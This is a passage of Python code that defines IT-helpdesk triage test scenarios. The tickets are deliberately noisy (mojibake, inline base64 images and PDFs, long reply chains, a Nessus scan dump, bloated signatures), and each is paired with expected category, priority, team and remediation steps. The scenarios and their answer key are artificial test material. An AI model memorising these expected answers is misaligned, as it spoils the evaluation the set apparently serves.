                "Objet\u00a0: probl\u00e8me r\u00e9seau \u2014 "
                "WiFi instable\n"
                "Date\u00a0: 2026-03-24T08:42:17-0400\n"
                "\n"
                "Bonjour l\u2019\u00e9quipe IT,\n"
                "\n"
                "Mon portable se d\u00e9connecte du WiFi "
                "\u00ab\u00a0CorpNet-5G\u00a0\u00bb toutes les "
                "10\u00a0minutes environ depuis lundi matin. "
                "Quand \u00e7a arrive, l\u2019ic\u00f4ne WiFi "
                "montre \ufffd\ufffd\ufffd (carr\u00e9s de "
                "remplacement \u2014 mon client mail a "
                "corrompu l\u2019encodage). Je suis au "
                "3e\u00a0\u00e9tage, bureau\u00a0312.\n"
                "\n"
                "D\u00e9tails techniques\u00a0:\n"
                "- Laptop\u00a0: Dell Latitude 5540\n"
                "- Carte WiFi\u00a0: Intel AX211 160\u00a0MHz\n"
                "- Driver\u00a0: 22.260.0.6 (derni\u00e8re "
                "version)\n"
                "- OS\u00a0: Windows 11 23H2\n"
                "- SSID\u00a0: CorpNet-5G (WPA3-Enterprise)\n"
                "- Sympt\u00f4me\u00a0: d\u00e9connexion "
                "toutes les ~10\u00a0min, reconnexion auto "
                "apr\u00e8s ~30\u00a0s\n"
                "- Pas de probl\u00e8me sur le r\u00e9seau "
                "filaire Ethernet\n"
                "\n"
                "J\u2019ai aussi essay\u00e9 \u00ab\u00a0Oublier "
                "le r\u00e9seau\u00a0\u00bb et me reconnecter, "
                "sans succ\u00e8s.\n"
                "\n"
                "Merci,\n"
                "Marc-Andr\u00e9\n"
                "\n"
                "---\n"
                "This email was converted from ISO-8859-1 to "
                "UTF-8. Some characters may display as \ufffd."
            ),
            category=Category.NETWORK,
            priority=Priority.P3,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.NETWORK_LOCATION],
            next_best_action=(
                "Investigate recurring WiFi disconnections on "
                "CorpNet-5G for a Dell Latitude 5540 with Intel "
                "AX211 adapter on floor 3, office 312. The mixed "
                "encoding (ISO-8859-1/UTF-8) and replacement "
                "characters are email-conversion artifacts — the "
                "real issue is the 10-minute WiFi drop cycle."
            ),
            remediation_steps=[
                "Check the wireless LAN controller for the "
                "access point serving floor 3 office 312 and "
                "review client roaming and disassociation events "
                "for the reporter's MAC address.",
                "Verify that the Intel AX211 driver 22.260.0.6 "
                "is on the corporate approved-driver list; test "
                "with the previous driver version if available.",
                "Run a Wi-Fi site survey on floor 3 to check "
                "for co-channel interference or coverage gaps "
                "near office 312.",
                "Confirm the WPA3-Enterprise RADIUS certificate "
                "chain is valid — an expiring intermediate cert "
                "can cause periodic reauthentication failures.",
                "As a workaround, configure the laptop to prefer "
                "the 2.4 GHz SSID to test whether the issue is "
                "specific to the 5 GHz / 6 GHz radio.",
            ],
            reporter_name="Marc-Andr\u00e9 B\u00e9langer",
            reporter_email="marc-andre.belanger@contoso.com",
            reporter_department="Risk Management",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "mixed-encoding",
                "replacement-chars",
                "wifi-disconnect",
            ],
            difficulty="hard",
        ),
        ScenarioDefinition(
            scenario_id="DC-187",
            subject=("Data corruption in client_transactions table"),
            description=(
                "Query: SELECT id, client_id, txn_date, amount, "
                "currency, status FROM client_transactions WHERE "
                "status = 'SETTLED' AND txn_date >= '2026-03-01' "
                "ORDER BY txn_date DESC LIMIT 40;\n"
                "\n"
                "id\tclient_id\ttxn_date\tamount\tcurrency"
                "\tstatus\n"
                "99410\tC-8812\t2026-03-23\t15420.00\tUSD"
                "\tSETTLED\n"
                "99409\tC-7731\t2026-03-23\t-842.50\tUSD"
                "\tSETTLED\n"
                "99408\tC-0019\t2026-03-22\t999999999.99\tUSD"
                "\tSETTLED\n"
                "99407\tC-8812\t2026-03-22\t7200.00\tEUR"
                "\tSETTLED\n"
                "99406\tC-0019\t2026-03-22\t-999999999.99\tUSD"
                "\tSETTLED\n"
                "99405\tC-5543\t2026-03-21\t3300.00\tGBP"
                "\tSETTLED\n"
                "99404\tC-2210\t2026-03-21\t12750.00\tUSD"
                "\tSETTLED\n"
                "99403\tC-0019\t2026-03-20\t0.01\tUSD"
                "\tSETTLED\n"
                "99402\tC-4478\t2026-03-20\t6800.00\tUSD"
                "\tSETTLED\n"
                "99401\tC-6690\t2026-03-19\tNULL\tNULL"
                "\tSETTLED\n"
                "(40 rows, truncated for brevity)\n"
                "\n"
                "Hi Data Platform team,\n"
                "\n"
                "I ran the query above and found multiple data "
                "integrity issues in the client_transactions "
                "table: row 99408 shows an impossible amount of "
                "999,999,999.99, row 99406 has a matching "
                "negative reversal that was never flagged, row "
                "99401 has NULL amount and currency for a SETTLED "
                "transaction, and row 99409 shows a negative "
                "amount that should have status REVERSED not "
                "SETTLED. These anomalies started appearing "
                "after the ETL pipeline migration on 2026-03-18. "
                "Our reconciliation report for March is blocked.\n"
                "\n"
                "Nadia Petrov\n"
                "Financial Reporting"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=True,
            missing_info=[
                MissingInfo.ENVIRONMENT_DETAILS,
                MissingInfo.TIMESTAMP,
            ],
            next_best_action=(
                "Investigate data integrity anomalies in the "
                "client_transactions table introduced after the "
                "ETL pipeline migration on 2026-03-18. The SQL "
                "output shows impossible amounts, orphaned "
                "reversals, NULL fields on settled rows, and "
                "incorrect status values."
            ),
            remediation_steps=[
                "Query for all rows inserted or updated after "
                "2026-03-18 with amount > 1,000,000 or amount "
                "IS NULL to determine the full scope of corrupt "
                "records.",
                "Review the ETL pipeline migration changeset "
                "from 2026-03-18 for changes to data-type "
                "mappings, NULL-handling, or constraint "
                "enforcement.",
                "Restore the affected rows from the pre-migration "
                "backup and run a diff against the current data "
                "to identify all discrepancies.",
                "Add CHECK constraints to the table to prevent "
                "NULL amounts on SETTLED transactions and amounts "
                "exceeding a configurable threshold.",
                "Re-run the March reconciliation report against "
                "the corrected data and confirm totals match the "
                "source ledger.",
            ],
            reporter_name="Nadia Petrov",
            reporter_email="nadia.petrov@contoso.com",
            reporter_department="Financial Reporting",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "sql-output",
                "data-corruption",
                "etl-migration",
            ],
            difficulty="hard",
        ),
        ScenarioDefinition(
            scenario_id="DC-188",
            subject="Password reset not working",
            description=(
                "CONFIDENTIALITY NOTICE / AVIS DE "
                "CONFIDENTIALIT\u00c9 / VERTRAULICHKEITSHINWEIS\n"
                "This email and any attachments are confidential "
                "and intended solely for the named recipient(s). "
                "If you have received this email in error, please "
                "notify the sender immediately and delete it.\n"
                "\n"
                "Ce courriel et toute pi\u00e8ce jointe sont "
                "confidentiels et destin\u00e9s uniquement au(x) "
                "destinataire(s) nomm\u00e9(s). Si vous avez "
                "re\u00e7u ce courriel par erreur, veuillez en "
                "aviser l\u2019exp\u00e9diteur imm\u00e9diatement "
                "et le supprimer.\n"
                "\n"
                "Diese E-Mail und alle Anh\u00e4nge sind "
                "vertraulich und ausschlie\u00dflich f\u00fcr "
                "den/die genannten Empf\u00e4nger bestimmt. "
                "Sollten Sie diese E-Mail irrt\u00fcmlich "
                "erhalten haben, benachrichtigen Sie bitte "
                "umgehend den Absender und l\u00f6schen Sie "
                "die Nachricht.\n"
                "\n"
                "\u6a5f\u5bc6\u4fdd\u6301\u306e\u304a\u77e5"
                "\u3089\u305b\uff1a\u3053\u306e\u30e1\u30fc"
                "\u30eb\u304a\u3088\u3073\u6dfb\u4ed8\u30d5"
                "\u30a1\u30a4\u30eb\u306f\u6a5f\u5bc6\u60c5"
                "\u5831\u3067\u3042\u308a\u3001\u6307\u5b9a"
                "\u3055\u308c\u305f\u53d7\u4fe1\u8005\u306e"
                "\u307f\u3092\u5bfe\u8c61\u3068\u3057\u3066"
                "\u3044\u307e\u3059\u3002\n"
                "\n"
                "\u4fdd\u5bc6\u58f0\u660e\uff1a\u672c\u90ae"
                "\u4ef6\u53ca\u5176\u9644\u4ef6\u5747\u4e3a"
                "\u673a\u5bc6\u4fe1\u606f\uff0c\u4ec5\u4f9b"
                "\u6307\u5b9a\u6536\u4ef6\u4eba\u4f7f\u7528"
                "\u3002\n"
                "\n"
                "--- Actual message below / Message ci-dessous "
                "/ Nachricht unten ---\n"
                "\n"
                "Hi,\n"
                "\n"
                "I can't reset my password on the Contoso IAM "
                "self-service portal (https://iam.contoso.com/"
                "reset). When I click 'Reset Password' after "
                "entering my email, the page spins for about "
                "20 seconds and then shows 'An unexpected error "
                "occurred. Please try again later.' I've tried "
                "Chrome 123, Edge 123, and Firefox 124 — same "
                "result on all three. My account is "
                "tomoko.hayashi@contoso.com and I need access "
                "restored before my 10:00 AM ET client call.\n"
                "\n"
                "Thanks,\n"
                "Tomoko Hayashi\n"
                "Client Advisory"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P3,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[
                MissingInfo.ERROR_MESSAGE,
                MissingInfo.AUTHENTICATION_METHOD,
            ],
            next_best_action=(
                "Investigate the IAM self-service password reset "
                "failure at https://iam.contoso.com/reset for "
                "user tomoko.hayashi@contoso.com. The multilingual "
                "legal disclaimer is boilerplate noise. The real "
                "issue is a server-side error during the password "
                "reset flow across all browsers."
            ),
            remediation_steps=[
                "Check the IAM portal application logs for "
                "errors associated with tomoko.hayashi@contoso"
                ".com around the reported timeframe.",
                "Verify the SMTP relay used by the password "
                "reset flow is operational — a failed email "
                "send can surface as a generic error.",
                "Manually reset the user's password via the "
                "admin console and send temporary credentials "
                "to restore access before the 10:00 AM call.",
                "Test the self-service reset flow with a test "
                "account to determine whether the issue is "
                "user-specific or portal-wide.",
                "Review recent deployments to the IAM portal for regressions in the password reset controller.",
            ],
            reporter_name="Tomoko Hayashi",
            reporter_email="tomoko.hayashi@contoso.com",
            reporter_department="Client Advisory",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "multilingual-disclaimer",
                "legal-boilerplate",
                "password-reset",
            ],
            difficulty="hard",
        ),
        ScenarioDefinition(
            scenario_id="DC-189",
            subject="Monitor not working — see attached screenshot",
            description=("See attached screenshot."),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[
                MissingInfo.DEVICE_INFO,
                MissingInfo.SCREENSHOT_OR_ATTACHMENT,
                MissingInfo.ERROR_MESSAGE,
                MissingInfo.STEPS_TO_REPRODUCE,
            ],
            next_best_action=(
                "The ticket contains no actionable detail — only "
                "'See attached screenshot' with no attachment "
                "present. Contact the reporter to obtain the "
                "monitor make/model, connection type, symptoms, "
                "and the missing screenshot."
            ),
            remediation_steps=[
                "Reply to the reporter requesting the monitor "
                "make, model, and connection type (HDMI, "
                "DisplayPort, USB-C).",
                "Ask whether the monitor shows no signal, a blank screen, flickering, or an error message.",
                "Request the screenshot that was referenced but not attached to the ticket.",
                "Once details are provided, check whether the "
                "issue matches any known fleet-wide display "
                "driver problems.",
                "If the reporter does not respond within 24 "
                "hours, set the ticket to 'Pending Caller' "
                "and schedule a follow-up.",
            ],
            reporter_name="Jordan Blake",
            reporter_email="jordan.blake@contoso.com",
            reporter_department="Marketing",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "near-empty",
                "missing-attachment",
                "no-details",
            ],
            difficulty="medium",
        ),
        ScenarioDefinition(
            scenario_id="DC-190",
            subject=("Nessus scan results — critical findings for prod cluster"),
            description=(
                "Nessus Professional 10.7.2 — Scan Report\n"
                "Policy: Contoso-PCI-Quarterly\n"
                "Scanner: nessus-prod-01.contoso.com\n"
                "Scan Start: 2026-03-23 02:00:00 UTC\n"
                "Scan End:   2026-03-23 04:47:33 UTC\n"
                "Hosts Scanned: 48\n"
                "Vulnerabilities Found: 312\n"
                "\n"
                "--- Critical (CVSS >= 9.0) ---\n"
                "Plugin 51192 | SSL Certificate Cannot Be "
                "Trusted\n"
                "  Host: pay.contoso.com (10.1.4.21)\n"
                "  Port: 443/tcp\n"
                "  CVSS: 6.5 (re-scored to Critical per "
                "Contoso policy — payment tier)\n"
                "  Synopsis: The SSL certificate for this "
                "service is not signed by a known CA.\n"
                "  Description: The X.509 certificate chain "
                "for pay.contoso.com:443 terminates at a self-"
                "signed root that is not in the scanner's trust "
                "store. Certificate details: Subject: "
                "CN=pay.contoso.com, O=Contoso Ltd; Issuer: "
                "CN=Contoso Internal CA G3; Not After: "
                "2026-04-01T23:59:59Z (EXPIRES IN 8 DAYS).\n"
                "\n"
                "Plugin 15901 | SSL Certificate Expiry\n"
                "  Host: pay.contoso.com (10.1.4.21)\n"
                "  Port: 443/tcp\n"
                "  CVSS: 5.3 (re-scored Critical — PCI scope)\n"
                "  Synopsis: The remote server's SSL certificate "
                "will expire within 30 days.\n"
                "  Description: Not After = 2026-04-01. Days "
                "remaining: 8.\n"
                "\n"
                "Plugin 20007 | SSL Version 2 and 3 Detection\n"
                "  Host: legacy-api.contoso.com (10.1.4.35)\n"
                "  Port: 8443/tcp\n"
                "  CVSS: 9.1\n"
                "  Synopsis: SSLv3 is enabled on this host.\n"
                "\n"
                "Plugin 104743 | TLS 1.0 Enabled\n"
                "  Host: legacy-api.contoso.com (10.1.4.35)\n"
                "  Port: 8443/tcp\n"
                "  CVSS: 7.5 (Critical per PCI-DSS 3.2.1)\n"
                "\n"
                "--- High (CVSS 7.0–8.9) ---\n"
                "(87 findings omitted for brevity)\n"
                "\n"
                "--- Medium (CVSS 4.0–6.9) ---\n"
                "(143 findings omitted for brevity)\n"
                "\n"
                "--- Low / Info ---\n"
                "(82 findings omitted for brevity)\n"
                "\n"
                "Hi Security team,\n"
                "\n"
                "The quarterly PCI Nessus scan finished this "
                "morning. The most urgent finding is that the "
                "TLS certificate on pay.contoso.com expires in "
                "8 days (2026-04-01). If it lapses we'll fail "
                "PCI-DSS compliance and the payment gateway "
                "will show cert warnings to customers. Can we "
                "get the renewal expedited?\n"
                "\n"
                "Also flagging SSLv3 and TLS 1.0 still enabled "
                "on legacy-api.contoso.com — that's been an "
                "open finding for two quarters.\n"
                "\n"
                "Regards,\n"
                "Fatima Al-Rashid\n"
                "Information Security — GRC"
            ),
            category=Category.SECURITY,
            priority=Priority.P2,
            team=Team.SECURITY_OPS,
            needs_escalation=True,
            missing_info=[
                MissingInfo.CONFIGURATION_DETAILS,
                MissingInfo.BUSINESS_IMPACT,
            ],
            next_best_action=(
                "Expedite the TLS certificate renewal for "
                "pay.contoso.com before the 2026-04-01 expiry "
                "to maintain PCI-DSS compliance. The Nessus "
                "scan dump is supporting evidence — the "
                "critical action item is the 8-day certificate "
                "countdown and the legacy TLS versions on "
                "legacy-api.contoso.com."
            ),
            remediation_steps=[
                "Submit an expedited certificate signing request "
                "(CSR) for pay.contoso.com to the Contoso "
                "Internal CA G3 or the public CA used for "
                "payment services.",
                "Install the renewed certificate on the payment "
                "gateway and validate the full chain with "
                "'openssl s_client -connect pay.contoso.com:443'.",
                "Disable SSLv3 and TLS 1.0 on legacy-api."
                "contoso.com:8443 by updating the server's TLS "
                "configuration to require TLS 1.2 or higher.",
                "Coordinate with the legacy-api application owner "
                "to verify that all clients support TLS 1.2+ "
                "before disabling older protocols.",
                "Set up automated certificate-expiry monitoring "
                "in the security tooling to alert at 30, 14, and "
                "7 days before expiry for all PCI-scoped hosts.",
            ],
            reporter_name="Fatima Al-Rashid",
            reporter_email="fatima.al-rashid@contoso.com",
            reporter_department="Information Security",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "vulnerability-scanner",
                "nessus-output",
                "tls-certificate",
                "pci-compliance",
            ],
            difficulty="hard",
        ),
        ScenarioDefinition(
            scenario_id="DC-191",
            subject="Printer not printing duplex - URGENT",
            description=(
                "Hi support, I need help with my printer. Here is a copy of the "
                "document I was trying to print (I pasted it so you can see): "
                "JVBERi0xLjQKMSAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwovUGFnZXMgMiAw "
                "IFIKPj4KZW5kb2JqCjIgMCBvYmoKPDwKL1R5cGUgL1BhZ2VzCi9LaWRzIFsz "
                "IDAgUl0KL0NvdW50IDEKL01lZGlhQm94IFswIDAgNjEyIDc5Ml0KPj4KZW5k "
                "b2JqCjMgMCBvYmoKPDwKL1R5cGUgL1BhZ2UKL1BhcmVudCAyIDAgUgovUmVz "
                "b3VyY2VzIDw8Ci9Gb250IDw8Ci9GMSAxMCAwIFIKPj4KPj4KL0NvbnRlbnRz "
                "IDQgMCBSCj4+CmVuZG9iagpzdHJlYW0KICBCVCB... [truncated] "
                "So that's the document. Anyway my ACTUAL problem is that my HP "
                "LaserJet Pro MFP M428fdw on the 5th floor will not print duplex. "
                "I select double-sided printing in the print dialog but it only "
                "prints on one side. I've tried from Word and Chrome, same result. "
                "The printer was working fine until last Tuesday."
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Strip the base64 PDF content from the ticket, check duplex unit configuration on the printer."
            ),
            remediation_steps=[
                "Remove the embedded base64 PDF content from the ticket.",
                "Verify the duplex unit is properly seated on the HP LaserJet Pro MFP M428fdw.",
                "Check the printer driver settings and ensure duplex is enabled at the driver level.",
                "Print a configuration page from the printer panel to confirm duplex hardware status.",
            ],
            reporter_name="Greg Holloway",
            reporter_email="greg.holloway@contoso.com",
            reporter_department="Finance",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "base64-pdf-inline", "embedded-document"],
            difficulty="medium",
        ),
        ScenarioDefinition(
            scenario_id="DC-192",
            subject="VPN keeps disconnecting PLEASE HELP",
            description=(
                "Dear IT Support, Let me start by telling you about my experience. "
                "I have been with this company for 14 years. I started using computers "
                "in 1997 when we had Windows 95. I remember those days fondly. My first "
                "PC had a Pentium II processor and 64 MB of RAM. We used dial-up internet "
                "and it was very slow. Then we upgraded to DSL and I thought that was "
                "amazing. My daily routine involves waking up at 6:30 AM, making coffee "
                "(French press, not drip), feeding my two cats (Whiskers and Mr. Boots), "
                "and then sitting down at my desk. I usually check email first, then open "
                "the spreadsheets I work on. I have been doing expense reports for 14 years "
                "and I think I am very good at it. My manager Janet agrees. Before I get to "
                "my issue let me also say that the cafeteria changed their menu and I am not "
                "happy about it - the chicken wrap was perfect and now they replaced it with "
                "some kind of quinoa bowl. Also the parking situation has gotten worse since "
                "they started construction on Building C. I used to park in spot 247 but now "
                "I have to park in the overflow lot which is a 10 minute walk. In the rain. "
                "Speaking of weather, it has been raining a lot here in Portland and I think "
                "that might be affecting the internet somehow? My neighbor said rain can affect "
                "signals. My home setup is a Netgear Nighthawk router that I bought in 2019. "
                "I also have a mesh extender in the hallway. My ISP is Comcast and I pay $89.99 "
                "per month for 200 Mbps. I ran a speed test yesterday and got 187 Mbps down and "
                "23 Mbps up which seems fine. But here is the thing - when I connect to the "
                "corporate VPN (GlobalProtect) it connects fine for about 15-20 minutes and "
                "then just drops. The icon in the system tray goes from connected (green) to "
                "disconnected (red). Sometimes it reconnects automatically, sometimes I have to "
                "manually click connect again. This happens 8-10 times per day and it is very "
                "frustrating especially when I am on a Teams call because the call drops too. "
                "I have tried restarting my computer, restarting my router, unplugging the mesh "
                "extender, and even connecting directly with an ethernet cable. Same issue with "
                "ethernet. I also want to mention that my keyboard has a sticky spacebar and "
                "sometimes the letter 'e' does not register but that is a separate issue. Also "
                "my monitor flickers sometimes but only on Tuesdays for some reason. Anyway the "
                "VPN thing is my main problem. Please help. Thank you so much. Best regards, "
                "Patricia. P.S. Can you also look into why my Outlook is slow? P.P.S. I forgot "
                "to mention I am running Windows 11 on a Dell Latitude 5530."
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.NETWORK_LOCATION],
            next_best_action=(
                "Extract the VPN disconnection issue from the verbose email "
                "and check GlobalProtect logs for disconnect reasons."
            ),
            remediation_steps=[
                "Extract the core issue: GlobalProtect VPN disconnects every 15-20 minutes.",
                "Collect GlobalProtect client logs from the user's Dell Latitude 5530.",
                "Check the VPN gateway logs for session timeout or keepalive failures.",
                "Verify the VPN split-tunnel configuration and MTU settings.",
                "File separate tickets for the keyboard, monitor, and Outlook issues mentioned.",
            ],
            reporter_name="Patricia Langford",
            reporter_email="patricia.langford@contoso.com",
            reporter_department="Finance",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "very-long-email", "extreme-verbosity"],
            difficulty="medium",
        ),
        ScenarioDefinition(
            scenario_id="DC-193",
            subject="Docking station display issue - see attached screenshots",
            description=(
                "Hello, my docking station is not working properly with my external "
                "monitors. Here are screenshots of the problem:\n\n"
                "Screenshot 1 (display settings):\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfF"
                "cSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+"
                "9AAAAFUlEQVR42mNk+M9QzwAEjDAGEGIAmkEF9QZKBbkAAAAASUVORK5CYII=\n\n"
                "Screenshot 2 (device manager):\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNby"
                "blAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5E"
                "rkJggg==\n\n"
                "Screenshot 3 (error popup):\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAIAAABLbSn"
                "cAAAADklEQVQI12P4z8BQDwAEgAF/QualIQAAAABJRU5ErkJggg==\n\n"
                "As you can see from the screenshots, my Dell WD19TB Thunderbolt "
                "docking station only outputs to one of my two Dell U2722D monitors. "
                "The second monitor shows 'No Signal'. This started after the Windows "
                "update last Friday. I have tried different DisplayPort cables and "
                "different ports on the dock. The dock firmware is version 01.00.28."
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Remove inline base64 image data and investigate the docking "
                "station display output failure on the second monitor."
            ),
            remediation_steps=[
                "Strip the base64-encoded image blocks from the ticket description.",
                "Check for docking station firmware updates beyond version 01.00.28.",
                "Roll back or verify the recent Windows update that preceded the failure.",
                "Test the second monitor directly connected to the laptop to isolate the dock.",
            ],
            reporter_name="Aiden Nakamura",
            reporter_email="aiden.nakamura@contoso.com",
            reporter_department="Engineering",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "base64-image-flood", "multiple-screenshots"],
            difficulty="medium",
        ),
        ScenarioDefinition(
            scenario_id="DC-194",
            subject="Can\u00e2\u20ac\u2122t install software on my laptop",
            description=(
                "Hi IT team,\n\n"
                "I\u00e2\u20ac\u2122m having trouble installing software on my laptop. "
                "When I try to run the installer for Adobe Acrobat Pro, I get an error "
                "that says \u00e2\u20ac\u0153Installation failed: insufficient "
                "privileges\u00e2\u20ac\u009d. I\u00e2\u20ac\u2122ve tried "
                "right-clicking and selecting \u00e2\u20ac\u0153Run as "
                "administrator\u00e2\u20ac\u009d but it doesn\u00e2\u20ac\u2122t help. "
                "My colleague Jos\u00c3\u00a9 said he had the same issue last "
                "week and the IT team fixed it for him. I\u00e2\u20ac\u2122m in the "
                "M\u00c3\u00bcnchen office on the 3rd floor. My laptop is a "
                "Lenovo\u00c2\u00a0ThinkPad T14s running "
                "Windows\u00c2\u00a0\u00e2\u20ac\u212211 Pro. The software center "
                "doesn\u00e2\u20ac\u2122t show Adobe in the available applications "
                "either. Can you please help? I need this for a client presentation "
                "on Fr\u00c3\u00acday. My manager\u00e2\u20ac\u2122s name is "
                "Fran\u00c3\u00a7ois Dub\u00c3\u00a9 and he approved the license. "
                "Thank you, Ren\u00c3\u00a9e \u00c3\u201c\u00e2\u20ac\u2122Brien"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Decode the mojibake-corrupted text to recover the real message "
                "and investigate the Adobe Acrobat Pro installation privilege error."
            ),
            remediation_steps=[
                "Decode the UTF-8/Windows-1252 mojibake to recover the original text.",
                "Check if the user's device is managed by Intune/SCCM and has local admin rights.",
                "Verify Adobe Acrobat Pro license availability and add it to the Software Center.",
                "Grant temporary elevation or deploy the application via endpoint management.",
            ],
            reporter_name="Renée O'Brien",
            reporter_email="renee.obrien@contoso.com",
            reporter_department="Client Services",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "mojibake-severe", "encoding-corruption"],
            difficulty="hard",
        ),
        ScenarioDefinition(
            scenario_id="DC-195",
            subject="Re: Re: Re: Re: Re: Re: Re: Re: Re: Re: Password reset",
            description=(
                ">>>>>>>>>> Original message from helpdesk@contoso.com:\n"
                ">>>>>>>>>> Hello, your password reset request has been received.\n"
                ">>>>>>>>> Thanks, but I haven't received the reset link yet.\n"
                ">>>>>>>> Forwarding to Tier 2 for investigation.\n"
                ">>>>>>> Tier 2 here. Can you confirm your employee ID?\n"
                ">>>>>> My employee ID is EMP-44821.\n"
                ">>>>> Thank you. We are looking into it.\n"
                ">>>> Any update? It has been 2 days.\n"
                ">>> We apologize for the delay. There was a system issue.\n"
                ">> The system issue should be resolved now. Can you try again?\n"
                "> I tried again and still no reset email. I have checked spam.\n\n"
                "I STILL cannot reset my password. It has now been 5 days. I am "
                "locked out of my account (username: dthompson@contoso.com) and "
                "cannot access any systems including email (using colleague's "
                "computer to send this). I need my Active Directory password reset "
                "manually. My manager is Sarah Chen (sarah.chen@contoso.com) who "
                "can verify my identity. Please call me at ext. 4821."
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P3,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.AUTHENTICATION_METHOD],
            next_best_action=(
                "Extract the password reset request from the deep reply chain "
                "and perform a manual AD password reset after identity verification."
            ),
            remediation_steps=[
                "Strip the 10+ levels of email quoting to extract the current request.",
                "Verify the user's identity through their manager Sarah Chen or employee ID EMP-44821.",
                "Perform a manual Active Directory password reset for dthompson@contoso.com.",
                "Investigate why the self-service password reset emails are not being delivered.",
            ],
            reporter_name="Derek Thompson",
            reporter_email="derek.thompson@contoso.com",
            reporter_department="Operations",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "deep-quoting", "excessive-reply-chain"],
            difficulty="medium",
        ),
        ScenarioDefinition(
            scenario_id="DC-196",
            subject="Bluetooth headset won't pair",
            description=(
                "My Jabra Evolve2 75 headset won't pair with my laptop via Bluetooth. "
                "I've tried resetting the headset and removing it from Bluetooth settings "
                "but it just shows 'Pairing failed' every time. I'm on a Dell Latitude "
                "5540 with Windows 11. The headset works fine with my phone.\n\n"
                "Best regards,\n"
                "Monica Estrada\n"
                "Senior Compliance Analyst\n"
                "Enterprise Risk & Compliance Division\n"
                "Contoso International Holdings, Ltd.\n"
                "Floor 23, Tower B | 1 Contoso Plaza | New York, NY 10001\n"
                "Tel: +1 (212) 555-0147 | Fax: +1 (212) 555-0148 | Ext: 7291\n"
                "Mobile: +1 (917) 555-0396\n"
                "Email: monica.estrada@contoso.com\n"
                "Web: https://www.contoso.com | LinkedIn: /in/monica-estrada\n"
                "Twitter: @ContosoCompliance | YouTube: /ContosoOfficial\n\n"
                "  ██████╗ ██████╗ ███╗   ██╗████████╗ ██████╗ ███████╗ ██████╗\n"
                " ██╔════╝██╔═══██╗████╗  ██║╚══██╔══╝██╔═══██╗██╔════╝██╔═══██╗\n"
                " ██║     ██║   ██║██╔██╗ ██║   ██║   ██║   ██║███████╗██║   ██║\n"
                " ██║     ██║   ██║██║╚██╗██║   ██║   ██║   ██║╚════██║██║   ██║\n"
                " ╚██████╗╚██████╔╝██║ ╚████║   ██║   ╚██████╔╝███████║╚██████╔╝\n"
                "  ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚══════╝ ╚═════╝\n\n"
                "CONFIDENTIALITY NOTICE: This e-mail message, including any attachments, "
                "is for the sole use of the intended recipient(s) and may contain "
                "confidential and privileged information. Any unauthorized review, use, "
                "disclosure or distribution is prohibited. If you are not the intended "
                "recipient, please contact the sender by reply e-mail and destroy all "
                "copies of the original message.\n\n"
                "AVIS DE CONFIDENTIALITÉ: Ce message électronique, y compris les pièces "
                "jointes, est destiné exclusivement au(x) destinataire(s) prévu(s) et peut "
                "contenir des informations confidentielles et privilégiées.\n\n"
                "VERTRAULICHKEITSHINWEIS: Diese E-Mail-Nachricht, einschließlich aller "
                "Anhänge, ist ausschließlich für den/die beabsichtigten Empfänger bestimmt.\n\n"
                "🌿 Please consider the environment before printing this email. 🌿\n"
                "♻️ Think Green - Reduce, Reuse, Recycle ♻️"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Strip the massive email signature and focus on the Bluetooth "
                "pairing failure between the Jabra headset and Dell laptop."
            ),
            remediation_steps=[
                "Remove the 2KB+ signature block including ASCII art, multilingual disclaimers.",
                "Update or reinstall the Bluetooth driver on the Dell Latitude 5540.",
                "Check if the Jabra Evolve2 75 firmware is up to date via Jabra Direct.",
                "Try pairing using the Jabra USB dongle as an alternative to native Bluetooth.",
            ],
            reporter_name="Monica Estrada",
            reporter_email="monica.estrada@contoso.com",
            reporter_department="Compliance",
            channel=Channel.EMAIL,
